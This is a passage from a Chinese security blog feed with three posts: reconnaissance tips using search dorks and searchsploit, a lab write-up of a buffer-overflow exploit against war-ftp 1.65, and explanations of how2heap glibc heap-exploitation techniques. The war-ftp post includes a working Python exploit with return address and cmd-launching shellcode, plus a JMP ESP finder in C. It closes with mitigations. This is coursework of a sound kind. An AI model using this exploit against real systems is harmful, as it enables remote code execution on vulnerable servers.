href="https://www.qichacha.com/">https://www.qichacha.com/</a>　　企查查<br><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a>　　天眼查<br><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a>　　国家企业信用信息公示系统</p><p><strong>搜索引擎查找敏感信息：</strong></p><p>site:xxx.xxx admin</p><p>site:xxx.xxx login </p><p>site:xxx.xxx system</p><p><strong>使用 Exploit-db 评估漏洞</strong><br>Exploit-db 是一个非常好的，查找已知漏洞的地方。它为我们提供了大量的漏洞利用细节，详细说明文档，shellcodes 等重要信息资源。我们可以使用关键字 CVE 或 OSVDB 来进行相关的查找工作</p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><strong>CVE Databases</strong><br>另一个非常优秀的漏洞信息查询库是  CVE database  我们可以到以下链接进行查询：<br><a href="https://cve.mitre.org/cve/cve.html">https://cve.mitre.org/cve/cve.html</a></p><p><strong>Kali Linux 下的 Searchsploit</strong></p><p>searchsploit [服务名称]</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>缓冲区溢出漏洞实战</title>
    <link href="/blog/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/"/>
    <url>/blog/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p><strong>记一个缓冲区溢出漏洞原理与利用的过程，加深对缓冲区溢出漏洞的理解，学习缓冲区溢出漏洞的防范方式。</strong></p><p><img src="/%5Cimages%5Cfj42.jpg"></p><span id="more"></span><h2 id="搭建Windows10-FTP服务器"><a href="#搭建Windows10-FTP服务器" class="headerlink" title="搭建Windows10 FTP服务器"></a>搭建Windows10 FTP服务器</h2><p>控制面板，程序与功能，选择启用或关闭Windows功能，在IIS中选择下列内容</p><p><img src="/%5Cimages%5Cftp.png"></p><p>确定之后等待几分钟Windows自动配置</p><p>然后进入开始面板，找到Windows管理工具，里面有个IIS管理器，打开：</p><p><img src="/%5Cimages%5Cftp1.png"></p><p>在左侧选择新建FTP站点，如下图：</p><p><img src="/%5Cimages%5Cftp2.png"></p><p>填写站点信息：</p><p><img src="/%5Cimages%5Cftp3.png"></p><p>配置IP和端口：</p><p><img src="/%5Cimages%5Cftp4.png"></p><p>配置权限：</p><p><img src="/%5Cimages%5Cftp5.png"></p><p>xp虚拟机访问：</p><p><img src="/%5Cimages%5Cftp6.png"></p><h2 id="war-ftp-1-65"><a href="#war-ftp-1-65" class="headerlink" title="war-ftp 1.65"></a>war-ftp 1.65</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li><p>ollydbg</p></li><li><p>war-ftp 1.65</p></li><li><p>Windows 10</p></li><li><p>Windows xp sp1</p></li><li><p>VC++6.0</p></li><li><p>python 3.7.2</p></li></ul><h3 id="使用ollydbg打开程序"><a href="#使用ollydbg打开程序" class="headerlink" title="使用ollydbg打开程序"></a>使用ollydbg打开程序</h3><p><img src="/images/clip_image002.jpg"></p><p>然后点击开始运行，出现下面的界面：</p><p><img src="/images/clip_image004.jpg"></p><p>允许匿名登录，点击那个最左边的黄色闪电符号开启服务</p><p><img src="/images/clip_image006.jpg"></p><h3 id="编写测试溢出的代码"><a href="#编写测试溢出的代码" class="headerlink" title="编写测试溢出的代码"></a>编写测试溢出的代码</h3><p>根据ppt内容，我们可以知道，漏洞是在向服务器发送超过480字节的用户名可以触发漏洞（即使用命令USER longString\r\n），溢出之后，ESP中的内容包含了longString中的部分内容。</p><p>编写python脚本，链接ftp服务：</p><p><img src="/images/clip_image008.jpg"></p><p>运行之后可以看到xp虚拟机中的程序已经崩溃了，查看ollydbg，我们可以看出EIP的值已经改变，编程41414141，也就是A的ascii码，证明确实有溢出漏洞。</p><p><img src="/images/clip_image010.jpg"></p><h3 id="确定溢出点"><a href="#确定溢出点" class="headerlink" title="确定溢出点"></a>确定溢出点</h3><p>ppt上面说是超过480，那么我们先用480试试</p><p><img src="/images/clip_image011.png"></p><p><img src="/images/clip_image013.jpg"></p><p>我们发现EIP变成了43434343也就是字符C，我们进一步确定溢出点应该是在486到490之间，继续细化：</p><p><img src="/images/clip_image014.png"></p><p><img src="/images/clip_image016.jpg"></p><p>我们可以看到EIP变成了45444342 即EDCB,因此溢出位置应该是在486-489</p><h3 id="查找JMP-ESP指令地址"><a href="#查找JMP-ESP指令地址" class="headerlink" title="查找JMP ESP指令地址"></a>查找JMP ESP指令地址</h3><p>如果选择 ESP 为跳转的寄存器，则需要 JMP ESP 的指令地址，在中文 Windows 系统核心 dll 中查找，  找到XP kernel32.dll 的 JMP ESP:<strong>0x77fb59cc</strong> ，此外可以使用中文 WIN 2K&#x2F;XP&#x2F;2003 下通用的 JMP ESP ： <strong>0x7ffa4512</strong></p><p><img src="/images/clip_image018.jpg"></p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">getJmpEsp</span><span class="hljs-params">(TCHAR *ucDllName)</span><br>&#123;<br>    HINSTANCE h;<br>     <br>    h = GetModuleHandle(ucDllName);  <span class="hljs-comment">//从当前进程获得dll的起始位置</span><br>    <span class="hljs-keyword">if</span>(h == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        h = LoadLibrary(ucDllName); <span class="hljs-comment">//若当前进程没有导入dll 则加载dll 到当前进程，并且记录起始位置</span><br>        <span class="hljs-keyword">if</span>(h == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;ucDllName&lt;&lt;<span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    BYTE* ptr=(BYTE*)h;<br>    <span class="hljs-type">bool</span> done=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> y=<span class="hljs-number">0</span>;!done;y++)<br>    &#123;<br>        try<br>        &#123;<br>            <span class="hljs-keyword">if</span>(ptr[y] == <span class="hljs-number">0xFF</span> &amp;&amp; ptr[y+<span class="hljs-number">1</span>] == <span class="hljs-number">0xE4</span>)  <span class="hljs-comment">// jmp esp对应的机器码 为FF E4, 进行查找</span><br>            &#123;<br>                <span class="hljs-type">int</span> pos=(<span class="hljs-type">int</span>)ptr + y;  <span class="hljs-comment">//找到jmp esp地址后，则加上起始地址，为jmp esp 在内存的绝对地址</span><br>                <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//输出jmp esp的地址</span><br>            &#125;<br>        &#125;catch(...)<br>        &#123;<br>            <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;END OF &quot;</span>&lt;&lt;ucDllName&lt;&lt;<span class="hljs-string">&quot; MEMORY REACHED&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>            done=<span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    FreeLibrary(h);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    getJmpEsp(<span class="hljs-string">&quot;ntdll&quot;</span>);  <span class="hljs-comment">//从ntdll.dll 查找jmp esp地址</span><br>    getJmpEsp(<span class="hljs-string">&quot;kernel32&quot;</span>); <span class="hljs-comment">//从kernel32.dll 查找jmp esp地址</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="构造攻击代码"><a href="#构造攻击代码" class="headerlink" title="构造攻击代码"></a>构造攻击代码</h3><p><img src="/images/clip_image020.png"></p><p>构造的攻击字串如图所示。</p><p>这里我们构造一个简单的shellcode简单验证一下原理：</p><p>构造shellcode使目标机运行cmd</p><p>查找WinExec的地址，ctrl+G输入WinExec即可：</p><p><img src="/images/clip_image022.jpg"></p><p>我们可以看到WinExec在我的xp虚拟机中的地址是77e4fd35</p><p>构造出来的payload：</p><p><img src="/images/clip_image023.png"></p><p>执行使用payload进行登录：</p><p><img src="/images/clip_image025.jpg"></p><p>成功执行了目标机的CMD。</p><p>后面可以去网上找一些比较功能完善的shellcode，比如创建一个系统管理员用户等。</p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> FTP<br>ftp = FTP(<span class="hljs-string">&#x27;192.168.52.143&#x27;</span>)<br><span class="hljs-comment">#ftp.login(&#x27;A&#x27; * 500, &#x27;www&#x27;)</span><br><span class="hljs-comment">#ftp.login(&#x27;A&#x27; * 480+&#x27;B&#x27;*5+&#x27;C&#x27;*5, &#x27;www&#x27;)</span><br>buf = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">485</span> + <span class="hljs-string">&#x27;\xcc\x59\xfb\x77&#x27;</span> + <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">4</span><br>buf += <span class="hljs-string">&quot;\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45&quot;</span><br>buf += <span class="hljs-string">&quot;\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6&quot;</span><br>buf += <span class="hljs-string">&quot;\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78&quot;</span><br>buf += <span class="hljs-string">&quot;\xC6\x45\xFE\x65\x6A\x01\x8D\x45\xF8\x50\xBA&quot;</span><br>buf += <span class="hljs-string">&quot;\x35\xfd\xe4\x77&quot;</span><br>buf += <span class="hljs-string">&quot;\xFF\xD2\xC9&quot;</span><br>ftp.login(buf, <span class="hljs-string">&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><p>从代码编写的角度来说，对于缓冲区的操作要进行严格的边界检查，这可借助一些工具如编译器来实现，像这次实践的 war-ftp 1.65 就应该对用户名数组边界进行检测；从运行状态来看，可进行动态保护，主要是数组边界检查和保证返回指针的完整性；从开发语言来看可使用安全的函数检测输入是否越界; 此外还可以从系统的角度阻止攻击代码的执行，例如非执行的缓冲区技术。对于操作系统而言， Windows 从 XP SP2 引入的 DEP(Data Execution Prevention) 即“数据执行保护”，一直延续到此后的 Windows Server 2003 、 Windows Server 2008 中，后者的 Address Space Load Randomization 让缓冲区溢出攻击变得非常困难，在 Windows 7 中， DEP 默认是激活的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>how2heap堆溢出利用练习</title>
    <link href="/blog/2020/04/15/how2heap%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/"/>
    <url>/blog/2020/04/15/how2heap%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>软件安全课上完后为了深入了解一下堆栈溢出漏洞及其利用方式，就去尝试了一下how2heap，写篇博客记录一下以后还能翻翻看看。</strong></p><p><img src="/images/fj41.jpg"></p><span id="more"></span><h2 id="0x00准备环境"><a href="#0x00准备环境" class="headerlink" title="0x00准备环境"></a>0x00准备环境</h2><p>下载代码练习包：<a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p><p>查看自己Linux主机glibc的版本，Ubuntu16应该是libc-2.23，可以在&#x2F;lib&#x2F;x86_64-linux-gnu目录下查找libc-2.xx即可看出来自己的glibc版本。由于我只做了how2heap的glibc2.25所以可以不用配置更高版本的glibc，如果想做glibc2.26就要自己配置一下glibc了，具体可以去网上找教程，很多。</p><p>解压之后进入主目录下有个makefile，所以我们直接make一下就可以编译好所有的文件。</p><h2 id="0x01malloc基础介绍"><a href="#0x01malloc基础介绍" class="headerlink" title="0x01malloc基础介绍"></a>0x01malloc基础介绍</h2><h3 id="0）-fastbin"><a href="#0）-fastbin" class="headerlink" title="0） fastbin"></a>0） fastbin</h3><p>fastbin是保存一些较小堆（32位系统默认不超过64字节，64位系统默认不超过128字节）的单链表结构。由于fastbin中相同index链接的都是相同大小的堆，ptmalloc认为不同位置的相同大小的堆没有区别，因此fastbin使用lifo的方法实现，即新释放的堆被链接到fastbin的头部，从fastbin中申请堆也是从头部取，这样就省去了一次遍历单链表的过程。fastbin的内存分配策略是exact fit，即只释放fastbin中跟申请内存大小恰好相等的堆。</p><h3 id="1）-smallbin"><a href="#1）-smallbin" class="headerlink" title="1） smallbin"></a>1） smallbin</h3><p>smallbin中包含62个循环双向链表，链表中chunk的大小与index的关系是2 size_t index。由于smallbin是循环双向链表，所以它的实现方法是fifo；smallbin的内存分配策略是exact fit。<br>从实现中可以看出smallbin链接的chunk中包含一部分fastbin大小的堆，fastbin范围的堆是有可能被链入其他链表的。当用户申请smallbin大小的堆而smallbin又没有初始化或者申请大于smallbin最大大小的堆时，fastbin中的堆根据prev_inuse位进行合并后会进入如上unsortedbin的处理流程，符合smallbin或largebin范围的堆会被链入相应的链表。<br>小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。每个small bin也是一个由对应free chunk组成的循环双链表。第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 61*8 &#x3D; 508字节。</p><h3 id="2）-Largebin"><a href="#2）-Largebin" class="headerlink" title="2） Largebin"></a>2） Largebin</h3><p>大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。<br>鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行从大到小的排列：最大的chunk放在链表的front end，最小的chunk放在rear end。<br>largebin包含63个循环双向链表，每个链表链接的都是一定范围大小的堆，链表中堆的大小按从大到小排序，堆结构体中的fd_nextsize和bk_nextsize字段标识链表中相邻largechunk的大小，即fd_nextsize标识比它小的堆块、bk_nextsize标识比它大的堆块。</p><p>对于相同大小的堆，释放的堆插入到bin头部，通过fd、bk与其他的堆链接形成循环双向链表。</p><p>Largebin的分配策略是best fit，即最终取出的堆是符合申请内存的最小堆（记为chunk）。若取出的chunk比申请内存大至少minsize，则分割chunk并取合适大小的剩余堆做为last remainder；若取出的chunk比申请内存不大于minsize，则不分割chunk直接返回做为用户申请内存块。</p><h3 id="3）-unsortedbin"><a href="#3）-unsortedbin" class="headerlink" title="3） unsortedbin"></a>3） unsortedbin</h3><p>unsortedbin可以视为空闲chunk回归其所属bin之前的缓冲区，分配策略是exact fit。可能会被链入unsortedbin的堆块是申请largebin大小堆块切割后的last remainder；释放不属于fastbin大小且不与topchunk紧邻的堆块时会被先链入unsortedbin；在特定情况下将fastbin内的堆合并后会进入unsortedbin的处理流程（特定情况为申请fastbin范围堆fastbin为空；申请非fastbin范围smallbin的堆但smallbin未初始化；申请largechunk）</p><h2 id="0x02-Glibc2-25部分"><a href="#0x02-Glibc2-25部分" class="headerlink" title="0x02 Glibc2.25部分"></a>0x02 Glibc2.25部分</h2><h3 id="1-fastbin-dup-consolidate"><a href="#1-fastbin-dup-consolidate" class="headerlink" title="1.fastbin_dup_consolidate"></a>1.fastbin_dup_consolidate</h3><p>原理是利用申请一次largebin大小的堆会将fastbin的堆进行合并进入unsortedbin的处理流程，此时再次free fastbin中的堆会绕过free时对fastbin链表头节点的检查进而构成一次doublefree<br>free时只会检查释放fastbin大小的堆时被释放的堆是否和fastbin的头结点是否一致，而在申请0x400的largechunk时，fastbin链表非空，fastbin中的堆会进行合并，并且进入unsortedbin的处理流程，在unsortedbin的处理流程中符合fastbin大小的堆会被放入smallbin，这样就绕过了free时对fastbin头结点的检查，从而可以构成一次对fastbin大小的堆的doublefree。</p><p><img src="/images/how2heap1.png"></p><p><img src="/images/how2heap1-1.png"></p><h3 id="2-fastbin-dup-into-stack"><a href="#2-fastbin-dup-into-stack" class="headerlink" title="2.fastbin_dup_into_stack"></a>2.fastbin_dup_into_stack</h3><p>在doublefree时我们有一次申请一个存在于fastbin链表的堆的机会，然后通过伪造堆的内容可以使得fastbin链入伪造的堆，再次申请内存可以得到伪造地址处的堆。<br>示例中先申请了3个0x8大小的堆，然后通过free(a)、free(b)、free(a)构成一次doublefree，导致我们后续还可以申请到a处的位置进行重写。此时fastbin的连接状态是a-&gt;b-&gt;a。再次申请两个0x8大小的堆，由于fastbin的lifo，此时fastbin中只剩a，且此时堆a存在于fastbin和用户申请的堆中，即我们可以控制一个存在于fastbin的堆的内容。容易想到的一种利用方式是伪造fastbin链表的内容，进而达到在伪造地址处申请堆的效果。</p><p>示例中在栈中伪造了一个0x20大小的堆，此时堆a的fd指向&amp;stack_var，即fastbin:a-&gt;stack_var，此时第二次申请不超过0x18大小的堆即可返回栈地址处的伪造堆，第二次malloc分配的是伪造的块，我们可以写的地方是&amp;starck_var+8~&amp;stack_var+16。</p><p><img src="/images/how2heap2.png"></p><h3 id="3-unsafe-unlink"><a href="#3-unsafe-unlink" class="headerlink" title="3.unsafe_unlink"></a>3.unsafe_unlink</h3><p>这是在堆可以溢出到下一个堆的size域且存在一个指向堆的指针时堆溢出的一种利用方式。Unsafe unlink利用的前提是可以溢出到下一个堆的size域，利用的大致思路是在chunk0构造fakechunk且fakechunk可以绕过unlink双向链表断链的检查，修改chunk1的pre_size使之等于fakechunk的大小，修改chunk1中size域的prev inuse位为0以便free(chunk1)时检查前后向堆是否空闲时（这里是后向堆，即物理低地址）触发unlink双向链表断链构成一次任意地址写。<br>示例中首先申请了两个0x80大小的堆chunk0和chunk1（非fastbin大小，因为fastbin大小的堆为了避免合并pre_inuse总是为1），然后在chunk0中构造fake_chunk</p><p><img src="/images/how2heap3.png"></p><p>需要注意的是，我们构造的fake chunk的起点是chunk0的数据部分即fd，fake chunk的prev size和size域正常赋值即可（最新的libc加入了cur_chunk’size&#x3D;next_chunk’s prev_size），fake chunk中关键的部分是fake data，这一部分要绕过unlink双向链表断链的检查，即fd-&gt;bk&#x3D;p&amp;&amp;bk-&gt;fd&#x3D;p。</p><p>malloc_chunk结构体如下：</p><p><img src="/images/how2heap3-1.png"></p><p>所以由结构体的寻址方式可得</p><p>(fd-&gt;bk&#x3D;fd+3* size_t)&#x3D;p<br>(bk-&gt;fd&#x3D;bk+2* size_t)&#x3D;p</p><p>所以可得</p><p>fd&#x3D;p-3* size_t<br>bk&#x3D;p-2* size_t</p><p>即fakechunk中fd和bk域如上构造即可绕过unlink双向链表的断链检查。<br>构造完fakechunk还需要修改下chunk1的prevsize和size的数据</p><p>断链的过程：</p><p>fd-&gt;bk&#x3D;bk 即(fd-&gt;bk&#x3D;p)&#x3D;(bk&#x3D;p-2* size_t)</p><p>bk-&gt;fd&#x3D;fd 即(bk-&gt;fd&#x3D;p)&#x3D;(fd&#x3D;p-3* size_t)</p><p>最终相当于：</p><p>p&#x3D;p-3* size_t</p><p>即获得了两个相等的指针（struct malloc_chunk * p），试想如果此时我们可以修改一个指针指向的地址同时可以修改另一个指针指向的内容不就可以构成一次任意地址写了吗？巧的是(p)我们恰好可以达到这样的效果。</p><p>此时我们修改fake_chunk[3]为要写的地址，修改fake_chunk[0]为要写的地址的内容即可。原因是fake_chunk[3]-3*size_t&#x3D;fake_chunk，这里相当于给fake_chunk指向一个新的地址；fake_chunk[0]访问的是&amp;fake_chunk[0]地址处的值，即上一步修改的地址处的内容。这样就构成了一次任意地址写。</p><p>结果我们可以看出，我们成功可以修改指定位置的数据:</p><p><img src="/images/how2heap3-2.png"></p><h3 id="4-house-of-spirit"><a href="#4-house-of-spirit" class="headerlink" title="4.house_of_spirit"></a>4.house_of_spirit</h3><p>利用fastbin范围的堆释放时粗糙的检查可以在任意地址处伪造fastbin范围fakechunk进而返回fakechunk的一种利用方式。思路是在指定地址处伪造fastbin范围的fakechunk，释放掉伪造的fakechunk，再次申请释放掉的fakechunk大小的堆即可得到fakechunk。</p><p><img src="/images/how2heap4.png"></p><p>我们构造的fakechunk只需要绕过free时的检查即可：</p><ol><li><p>2*size_sz&lt;next chunksize&lt;sys mem，即图中0x1234要满足限制在这个范围</p></li><li><p>伪造的fakechunk不能是fastbin的头结点，即不能直接构成doublefree</p></li></ol><p>利用house of spirit可以得到fakechunk处的堆，同时如果我们有fakechunk处写的权限利用fastbinattack即可劫持控制流。</p><p><img src="/images/how2heap4-1.png"></p><h3 id="5-house-of-lore"><a href="#5-house-of-lore" class="headerlink" title="5.house_of_lore"></a>5.house_of_lore</h3><p>利用伪造smallbin链表来最终达到一次任意地址分配内存的效果。前提是可以在要分配的地址处伪造堆（修改结构体中fd、bk的指向），且可以修改victim堆（被释放的smallbin堆）的bk指针</p><p>方法是在要分配的内存地址（如栈地址）处构造一个fake smallbin chunk链，使之如下图所示：</p><p><img src="/images/how2heap5.png"></p><p>然后申请一个堆防止释放victim的时候合并到topchunk，释放掉victim，此例中victim会进入fastbin链表。</p><p>再次申请一个largechunk，触发fastbin的合并过程并使fastbin的堆进入unsortedbin的处理流程，victim处于smallbin的范围最终被链入smallbin头结点。而由于我们事先构造了如上的fake smallbin链，此时smallbin的链接情况是smallbin:victim-&gt;stack_buf1-&gt;stack_buf2。</p><p>由于smallbin的exact fit和fifo策略，此时申请一个victim大小的堆会直接返回bin结点bk指向的victim（bin的结构体是mchunkptr*），然后断链并修改bin的bk指针指向victim的bk节点即stack_buf1</p><p>此时stack_buf1的结构如下smallbin:stack_buf1-&gt;stack_buf2</p><p>这样此时再申请一个victim大小的堆直接取smallbin的bk指向的stack_buf1即得到相应地址处的堆，达到了任意地址分配内存的效果</p><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6.overlapping_chunks"></a>6.overlapping_chunks</h3><p>通过修改一个位于空闲链表的堆的size域可以构成一次堆重叠。<br>首先申请三块空间，并且将p2 free掉：</p><p><img src="/images/how2heap6.png"></p><p>可以看出，空间p1、p2、p3分别用1、2、3填充。<br>然后我们修改p2的size值：</p><p><img src="/images/how2heap6-1.png"></p><p>我们看到我们把chunksize修改为0x181。当我们再次申请一个p2 size大小的堆的时候，会得到从p2位置起始的fake size大小的堆p4。<br>如果我们向p4写入fake size的数据时，会将p3的数据覆盖掉：</p><p><img src="/images/how2heap6-2.png"></p><p>本质就是修改一个位于空闲链表的堆的size域可以构成一次堆重叠。</p><h3 id="7-overlapping-chunks-2"><a href="#7-overlapping-chunks-2" class="headerlink" title="7.overlapping_chunks_2"></a>7.overlapping_chunks_2</h3><p>原理：通过堆溢出修改下一个占用态堆的size域构成一次堆重叠<br>free p4后p5的prevsize为0x3f0:</p><p><img src="/images/how2heap7.png"></p><p>修改p2的size域为p2+p3+标志位，释放掉。此时glibc会认为p2的size域的大小包围的堆是要被释放的，会错误的修改p5的prevsize值。Free之后我们查看p5的prevsize为：</p><p><img src="/images/how2heap7-1.png"></p><p><img src="/images/how2heap7-2.png"></p><p>此时由于物理相邻的前向堆p4处于空闲态，fake p2会和p4合并链入largebin。然后申请2000大小的largechunk会将上述合并后的堆切割后返回p2起始的堆，从而构成一次堆重叠</p><p><img src="/images/how2heap7-3.png"></p><p>然后将p6写入1500字节F，打印出p3结果：</p><p><img src="/images/how2heap7-4.png"></p><p>我们可以看出p6写入时成功覆盖掉p3前500字节，成功依靠p2 free后重申请修改了p3。</p><h3 id="8-house-of-force"><a href="#8-house-of-force" class="headerlink" title="8.house_of_force"></a>8.house_of_force</h3><p>原理：利用topchunk分配内存的特点可以通过一次溢出覆盖topchunk的size域得到一次任意地址分配内存的效果。<br>首先通过一次堆溢出覆盖topchunk的size域为一个超大的整数（如-1），避免申请内存时进入mmap流程：</p><p><img src="/images/how2heap8.png"></p><p>然后申请一个evilsize大小的堆改变topchunk的位置。evilsize的计算如下，这么计算的原因是当bin都为空时会从topchunk处取堆：</p><p><img src="/images/how2heap8-1.png"></p><p>修改topchunk到目标地址后在申请一次堆即可对目标地址处的内存进行改写：</p><p><img src="/images/how2heap8-2.png"></p><h3 id="9-unsorted-bin-into-stack"><a href="#9-unsorted-bin-into-stack" class="headerlink" title="9.unsorted_bin_into_stack"></a>9.unsorted_bin_into_stack</h3><p>通过修改位于unsorted bin的victim堆的size域和bk指针指向目标fake chunk（stack_buffer），在目标地址构造fake chunk（构造size和bk指针。我们也可以不修改victim的size，malloc两次得到目标地址的fake chunk；原理都是构造fake unsorted bin链表）可以得到一次任意地址申请内存的机会。</p><p><img src="/images/how2heap9.png"></p><p>改变victim的值要满足check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem</p><p><img src="/images/how2heap9-1.png"></p><p>下一次申请内存时，遍历unsortedbin时可以得到目标地址处的伪造堆：</p><p><img src="/images/how2heap9-2.png"></p><h3 id="10-unsorted-bin-attack"><a href="#10-unsorted-bin-attack" class="headerlink" title="10.unsorted_bin_attack"></a>10.unsorted_bin_attack</h3><p>通过伪造unsortbin链表进行unsortedbin attack泄露信息（libc基址）的一种方法<br>定义一个stack_var的变量，用于后面获取bin的基址，后面申请了一块空间，之后内存布局如下：p-&gt;fd &#x3D;  bin  p-&gt;bk &#x3D; &amp;stack_var。</p><p><img src="/images/how2heap10.png"></p><p>最后再malloc的时候，前一个块会被分配出去，然后p就会指向bin的基地址，因而暴露了敏感信息：</p><p><img src="/images/how2heap10-1.png"></p><h3 id="11-large-bin-attack"><a href="#11-large-bin-attack" class="headerlink" title="11.large_bin_attack"></a>11.large_bin_attack</h3><p>原理：利用malloc进行unsortedbin处理时插入largebin通过修改largebin链表上的堆的bk、bk_nextsize均可以得到任意地址写的机会。<br>首先要申请如上图3个堆和相应的为了避免合并到topchunk的barrier，其中p1要保证是smallbin且非fastbin范围（且保证在后续申请堆时堆大小够用），p2、p3要保证是largebin范围。</p><p><img src="/images/how2heap11.png"></p><p>（1）然后依次释放p1、p2，由于非fastbin范围的堆在释放后会首先链入unsortedbin，此时unsortedbin的情况是：unsortedbin:p2-&gt;p1</p><p><img src="/images/how2heap11-1.png"></p><p>（2）此时申请一个0x90大小的堆，从glibc的源码中可以看到遍历unsortedbin的过程是从bin头结点的bk指针开始遍历。这样取到的第一个堆是0x320大小的p1，p1满足0x90的申请，glibc会从p1中分割出0x90的大小，然后继续遍历unsortedbin直至遍历结束；此时得到链表的第二个堆0x400大小的p2，p2非smallbin范围且largebin为空，被链入largebin：</p><p><img src="/images/how2heap11-2.png"></p><p>此时unsortbin：(p1-0x90)，largebin：p2。<br>然后释放0x400大小的p3，p3非fastbin范围被链入unsortedbin头结点（fd指向p3）<br>（3）此时利用溢出或其他手段修改largebin中的p2的bk、bk_nextsize和size。可以看到p2修改前的size为0x411，代码中把它修改成了0x3f1，这样做是因为largebin中链接的一定范围的堆是从大到小降序排列的，修改后0x400大小的p3被链入largebin时会被链入头结点。</p><p>在做好以上的准备工作后再次申请一个0x90大小的堆，同（2）过程依然由p2分割得到堆，由于p3&gt;修改后的p2的size，p3被链入largebin头结点。链入的过程类似unlink，类似的我们得到了一次任意地址写的机会。</p><p><img src="/images/how2heap11-3.png"></p><p>执行结果：</p><p><img src="/images/how2heap11-4.png"></p>]]></content>
    
    
    
    <tags>
      
